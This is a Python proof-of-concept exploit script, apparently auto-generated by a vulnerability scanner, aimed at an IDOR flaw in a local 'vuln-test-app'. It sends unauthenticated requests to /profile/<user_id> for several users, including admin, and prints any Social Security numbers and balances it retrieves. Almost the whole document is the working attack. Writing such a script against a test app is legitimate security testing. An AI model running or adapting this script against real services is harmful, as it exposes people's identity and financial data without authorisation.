#!/usr/bin/env python3
# PoC for vuln-test-app (/tmp/vuln-test-app)
# Path: suspicious-007
# Sink: get_user_profile
# Auto-generated — run with: python3 idor_any_caller_access_any_get_user_profile.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for IDOR vulnerability in vuln-test-app.

Vulnerability: Insecure Direct Object Reference (IDOR) in get_user_profile.
The function returns sensitive user data (SSN, balance) based solely on the
user_id parameter without any authentication or authorization check.

Usage:
    python3 poc_idor.py [--target http://localhost:5000]
"""

import argparse
import json
import sys
import requests

# Default target URL (adjust if needed)
DEFAULT_TARGET = "http://localhost:5000"

def exploit_idor(target_url):
    """
    Exploit the IDOR vulnerability by requesting profiles of different users.
    """
    # Define user IDs to test (including admin)
    user_ids = ["alice", "bob", "admin"]

    print(f"[*] Targeting {target_url}")
    print("[*] Attempting to access user profiles without authentication...\n")

    for uid in user_ids:
        try:
            # Construct the API endpoint (assuming /profile/<user_id>)
            url = f"{target_url.rstrip('/')}/profile/{uid}"
            response = requests.get(url, timeout=10)

            if response.status_code == 200:
                try:
                    data = response.json()
                    # Check if we got sensitive fields
                    if "ssn" in data and "balance" in data:
                        print(f"[+] SUCCESS: Retrieved profile for '{uid}'")
                        print(f"    SSN: {data['ssn']}")
                        print(f"    Balance: {data['balance']}")
                        print(f"    Full response: {json.dumps(data, indent=4)}\n")
                    else:
                        print(f"[?] Got 200 for '{uid}' but response lacks expected fields: {data}\n")
                except json.JSONDecodeError:
                    print(f"[?] Got 200 for '{uid}' but response is not JSON: {response.text}\n")
            elif response.status_code == 404:
                print(f"[-] User '{uid}' not found (404)\n")
            else:
                print(f"[-] Unexpected status {response.status_code} for '{uid}': {response.text[:200]}\n")

        except requests.exceptions.ConnectionError:
            print(f"[!] Connection error: Could not reach {target_url}")
            print("    Is the server running?")
            sys.exit(1)
        except requests.exceptions.Timeout:
            print(f"[!] Timeout: Server did not respond within 10 seconds")
            sys.exit(1)
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            sys.exit(1)

    print("[*] Exploit completed. If any profiles were retrieved, the IDOR vulnerability is confirmed.")

def main():
    parser = argparse.ArgumentParser(description="IDOR PoC for vuln-test-app")
    parser.add_argument("--target", default=DEFAULT_TARGET,
                        help=f"Target URL (default: {DEFAULT_TARGET})")
    args = parser.parse_args()

    exploit_idor(args.target)

if __name__ == "__main__":
    main()
